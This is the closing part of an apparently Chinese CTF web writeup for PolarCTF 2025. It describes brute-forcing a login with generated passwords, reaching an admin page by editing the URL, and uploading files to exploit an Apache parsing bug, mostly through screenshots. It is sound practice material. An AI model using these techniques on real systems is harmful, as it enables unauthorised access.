+</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>拿到 flag</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">rev-\flag</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="file-20250324120341117.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<h1 class="heading-element" id="小白说收集很重要"><span>小白说收集很重要</span>
+  <a href="#%e5%b0%8f%e7%99%bd%e8%af%b4%e6%94%b6%e9%9b%86%e5%be%88%e9%87%8d%e8%a6%81" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p><figure>
+  <img src="file-20250324151536705.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p><figure>
+  <img src="file-20250324151555548.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p><code>/users.json</code>
+<figure>
+  <img src="file-20250324151645621.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>爆破
+<figure>
+  <img src="file-20250324154000073.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>登录</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">admin01/admin</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>提示寻找管理员账号密码登录界面
+<figure>
+  <img src="file-20250324154215535.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>后面一直尝试爆破，用户名换了很多，密码使用登录后的社工密码生成也生成了许多，但爆破成功的登录进去都是普通用户，实在没有进展，于是切换思路尝试越权
+现在是 <code>/user_dashboard.php</code>
+<figure>
+  <img src="file-20250324154434672.png" alt="image-20250221181200747" loading="lazy"></figure>
+
+要到管理员界面，先尝试直接切换 URL</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">/admin_dashboard.php</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>直接成功，获取 Flag
+<figure>
+  <img src="file-20250324154550278.png" alt="image-20250221181200747" loading="lazy"></figure>
+
+<figure>
+  <img src="file-20250324154643897.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>看了官方WP，这题还有另外一个思路，就是通过爆破拿到管理员账号密码
+社工密码生成，填入一些赛方关键词，生成密码</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">xiaobai,admin</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="file-20250324154821782.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>账号名选用一些常用弱口令账号，爆破
+<figure>
+  <img src="file-20250324155348878.png" alt="image-20250221181200747" loading="lazy"></figure>
+
+这样也有机会碰进管理员界面</p>
+<h1 class="heading-element" id="投喂20"><span>投喂2.0</span>
+  <a href="#%e6%8a%95%e5%96%8220" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p><figure>
+  <img src="file-20250324155525438.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>.htaccess 能传，图片也能传，就是不生效，试了很久
+<figure>
+  <img src="file-20250324160449946.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>后面尝试 apache 解析漏洞
+<figure>
+  <img src="file-20250324165853696.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>执行成功
+<figure>
+  <img src="file-20250324170057507.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+</div><div id="comments"><div id="giscus" class="comment">
+          <script
+            src="https://giscus.app/client.js"
+            data-repo="L1nq0/L1nq0.github.io"
+            data-repo-id="R_kgDOSLdcIg"
+            data-category="Announcements"
+            data-category-id="DIC_kwDOSLdcIs4DA03P"
+            data-mapping="pathname"
+            data-strict="0"
+            
+            data-theme="preferred_color_scheme"
+            data-reactions-enabled="1"
+            data-emit-metadata="0"
+            data-input-position="bottom"
+            data-lang="zh-CN"
+            data-loading="lazy"
+            crossorigin="anonymous"
+            async
+            defer
+          ></script>
+        </div>
+        <noscript>
+          Please enable JavaScript to view the comments powered by <a href="https://giscus.app/" rel="external nofollow noopener noreferrer">giscus</a>.
+        </noscript></div><div class="post-footer" id="post-footer"><ul class="post-footer-tags"><li class="post-footer-tag-item">
+          <a href="/tags/ctf/" class="post-footer-tag-link" title="Tags - CTF">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="post-footer-tag-icon"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9l14 0"/><path d="M5 15l14 0"/><path d="M11 4l-4 16"/><path d="M17 4l-4 16"/></svg>
+            <span>CTF</span>
+          </a>
+        </li></ul><div class="post-footer-share">
+    <span class="post-footer-share-label">Share this post on:</span>
+    <div class="post-footer-share-links"><a href="javascript:void(0);" title="Share on X" data-sharer="twitter" data-url="https://sw1mblu3.fun/posts/polarctf-2025%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E8%B5%9B/" data-title="PolarCTF 2025 春季个人赛 Web Writeup" data-via="map[icon:map[angellist: bandcamp: behance: bilibili: bitbucket: bluesky: buymeacoffee: class:fa-brands fa-x-twitter codepen: credly: csdn: deviantart: devto: diaspora: discord: discordinvite: douban: douyin: dribbble: facebook: feishu: fivehundredpx: flickr: foursquare: freecodecamp: gitea: gitlab: goodreads: googlescholar: hackernews: hackthebox: instagram: jsfiddle: kaggle: keybase: kickstarter: ko-fi: lastfm: liberapay: lichess: linktree: mastodon: matrix: mediawiki: medium: mix: odnoklassniki: orcid: patreon: paypal: phone: pinterest: pleroma: plume: qq: qqgroup: quora: reddit: researchgate: rootme: skype: slidershare: snapchat: soundcloud: spotify: stackoverflow: steam: strava: telegram: thingiverse: tiktok: tryhackme: tumblr: twitch: vine: vk: weibo: whatsapp: wordpress: xing: xmpp: youtubechannel: youtubecustom: youtubelegacy: zhihu:] id:L1nq1_ prefix:https://x.com/ title:X weight:2]" data-hashtags="CTF"><i class="fa-brands fa-x-twitter" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://sw1mblu3.fun/posts/polarctf-2025%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E8%B5%9B/" data-hashtag="CTF"><i class="fa-brands fa-facebook-square" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://sw1mblu3.fun/posts/polarctf-2025%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E8%B5%9B/" data-title="PolarCTF 2025 春季个人赛 Web Writeup"><i class="fa-brands fa-weibo" aria-hidden="true"></i></a>
+  </div>
+  </div><hr class="post-footer-divider">
+    <div class="post-footer-nav"><a href="/posts/nctf-2025%E6%98%A5%E5%AD%A3%E8%B5%9B/" class="post-footer-nav-prev" rel="prev">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="post-footer-nav-arrow"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M15 6l-6 6l6 6"/></svg>
+          <div>
+            <span class="post-footer-nav-label">Previous Post</span>
+            <div class="post-footer-nav-title">NCTF 2025 Web Writeup&amp;Challenge Walkthrough</div>
+          </div>
+        </a><a href="/posts/cslab-thunder/" class="post-footer-nav-next" rel="next">
+          <div>
+            <span class="post-footer-nav-label">Next Post</span>
+            <div class="post-footer-nav-title">Cyberstrikelab Thunder Writeup</div>
+          </div>
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="post-footer-nav-arrow"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 6l6 6l-6 6"/></svg>
+        </a></div></div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside><dialog id="toc-dialog" aria-labelledby="toc-dialog-title" role="dialog">
+      <div class="toc">
+        <h2 class="toc-title">Contents</h2>
+        <div class="toc-content" id="toc-content-drawer"><nav >
+  <ul>
+    <li><a href="#code的登录">code的登录</a></li>
+    <li><a href="#再给我30元">再给我30元</a></li>
+    <li><a href="#0e事件">0e事件</a></li>
+    <li><a href="#来个弹窗">来个弹窗</a></li>
+    <li><a href="#bllbl_rce">bllbl_rce</a></li>
+    <li><a href="#复读机rce">复读机RCE</a></li>
+    <li><a href="#狗黑子ctf变强之路">狗黑子CTF变强之路</a></li>
+    <li><a href="#椰子树晕淡水鱼">椰子树晕淡水鱼</a></li>
+    <li><a href="#background">background</a></li>
+    <li><a href="#xcsmsd">xCsMsD</a></li>
+    <li><a href="#小白说收集很重要">小白说收集很重要</a></li>
+    <li><a href="#投喂20">投喂2.0</a></li>
+  </ul>
+</nav></div>
+      </div>
+    </dialog><script>
+  (function() {
+    var tocLinks = document.querySelectorAll('#TableOfContents a');
+    var headings = document.querySelectorAll('.heading-element');
+    if (!tocLinks.length || !headings.length) return;
+
+    var linkMap = {};
+    tocLinks.forEach(function(a) {
+      var href = a.getAttribute('href');
+      if (href) linkMap[href] = a;
+    });
+
+    var tocLis = document.querySelectorAll('#TableOfContents li');
+    var activeId = null;
+
+    function setActive(id) {
+      if (id === activeId) return;
+      activeId = id;
+
+      var link = linkMap[id];
+      if (!link) return;
+
+      tocLinks.forEach(function(a) { a.classList.remove('active'); });
+      tocLis.forEach(function(li) { li.classList.remove('has-active'); });
+
+      link.classList.add('active');
+      var li = link.closest('li');
+      while (li) {
+        li.classList.add('has-active');
+        var parentUl = li.parentElement;
+        if (!parentUl || parentUl.id === 'TableOfContents') break;
+        li = parentUl.closest('li');
+      }
+    }
+
+    var observer = new IntersectionObserver(function(entries) {
+      var topEntry = null;
+      entries.forEach(function(entry) {
+        if (entry.isIntersecting) {
+          if (!topEntry || entry.boundingClientRect.top < topEntry.boundingClientRect.top) {
+            topEntry = entry;
+          }
+        }
+      });
+      if (topEntry) {
+        setActive('#' + topEntry.target.id);
+      }
+    }, {
+      rootMargin: '-80px 0px -50% 0px',
+      threshold: 0
+    });
+
+    headings.forEach(function(h) { observer.observe(h); });
+  })();
+  </script></main><footer class="footer">
+  <div class="footer-container"><hr class="footer-divider">
+
+    <div class="footer-row"><div class="footer-social">
+        <a href="https://github.com/L1nq0" target="_blank" rel="noopener noreferrer" class="footer-icon" title="GitHub">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+            <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5"/>
+          </svg>
+        </a>
+        <a href="mailto:cryp71csec@gmail.com" class="footer-icon" title="Email">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 7a2 2 0 0 1 2 -2h14a2 2 0 0 1 2 2v10a2 2 0 0 1 -2 2h-14a2 2 0 0 1 -2 -2v-10z"/>
+            <path d="M3 7l9 6l9 -6"/>
+          </svg>
+        </a>
+      </div><div class="footer-line">
+        <span>Copyright &copy; 2026</span>
+        <span class="footer-sep">|</span>
+        <span>All rights reserved.</span>
+      </div>
+    </div>
+  </div>
+</footer>
+</div><div class="widgets"><div class="fixed-buttons"><div class="fixed-button back-to-top animate__faster d-none" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up" aria-hidden="true"></i></div><div id="toc-drawer-button" class="fixed-button toc-drawer-button d-none" role="button" aria-label="Contents"><i class="fa-solid fa-bars" aria-hidden="true"></i></div><div class="fixed-button view-comments d-none" role="button" aria-label="View Comments"><i class="fa-solid fa-comment" aria-hidden="true"></i></div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/cell-tooltip/cell-tooltip.umd.js" defer></script><script src="/js/config/bed8e24533c0558dae97c318aacb64db.js" defer></script><script src="/js/theme.min.js" defer></script></body>
+</html>
